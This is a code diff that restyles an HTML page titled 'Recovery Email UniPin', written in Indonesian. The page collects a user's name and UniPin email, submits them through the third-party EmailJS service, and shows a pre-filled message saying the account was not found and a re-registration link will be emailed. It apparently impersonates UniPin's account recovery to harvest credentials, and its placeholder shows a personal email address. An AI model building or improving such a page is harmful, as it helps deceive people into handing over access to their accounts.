@@ -5,68 +5,84 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Recovery Email UniPin</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
     <style>
+        * {
+            box-sizing: border-box;
+        }
         body {
             margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            color: #fff;
         }
         .form-container {
-            background-color: #ffffff;
+            background: rgba(0, 0, 0, 0.85);
             padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            border-radius: 20px;
+            box-shadow: 0 0 20px #00ffe7, 0 0 40px #9400ff;
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
         }
         .form-container h2 {
-            margin-bottom: 20px;
-            color: #333;
+            margin-bottom: 25px;
+            color: #00ffe7;
             text-align: center;
+            text-shadow: 0 0 10px #00ffe7;
         }
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 18px;
         }
         label {
             font-weight: bold;
             display: block;
-            margin-bottom: 5px;
-            color: #555;
+            margin-bottom: 6px;
+            color: #ff00cc;
         }
         input, textarea {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
             font-size: 14px;
+            background-color: #1a1a2e;
+            color: #fff;
+            outline: none;
+            box-shadow: 0 0 10px #00ffe7 inset;
+        }
+        textarea {
+            resize: none;
         }
         button {
             width: 100%;
-            padding: 12px;
-            background-color: #0072ff;
+            padding: 14px;
+            background: linear-gradient(90deg, #ff00cc, #3333ff);
             color: #fff;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            transition: background 0.3s ease;
+            box-shadow: 0 0 15px #ff00cc;
+            transition: transform 0.3s ease;
         }
         button:hover {
-            background-color: #0056cc;
+            transform: scale(1.05);
+            box-shadow: 0 0 25px #ff00cc, 0 0 45px #3333ff;
         }
     </style>
 </head>
 <body>
 
 <div class="form-container">
-    <h2>Formulir Pemulihan Email UniPin</h2>
+    <h2>Recovery Email UniPin</h2>
     <div class="form-group">
         <label for="name">Nama Lengkap</label>
-        <input type="text" id="name" placeholder="Masukkan nama Anda Id. ellytatasya10@gmail.com" required>
+        <input type="text" id="name" placeholder="Masukkan nama Anda. Id: ellytatasya10@gmail.com" required>
     </div>
     <div class="form-group">
         <label for="email">Email UniPin</label>
@@ -78,7 +94,7 @@
     </div>
     <div class="form-group">
         <label for="message">Detail Permintaan</label>
-        <textarea id="message" rows="4" placeholder="Account anda tidak di temukan di Unipin.Id . Silahkan registry lagi di link yang akan di kirim di email anda." required></textarea>
+        <textarea id="message" rows="4" placeholder="Akun Anda tidak ditemukan di UniPin. Silakan registrasi ulang melalui link yang akan dikirim ke email Anda." required></textarea>
     </div>
     <button onclick="sendMessage();">Kirim Permintaan</button>
 </div>
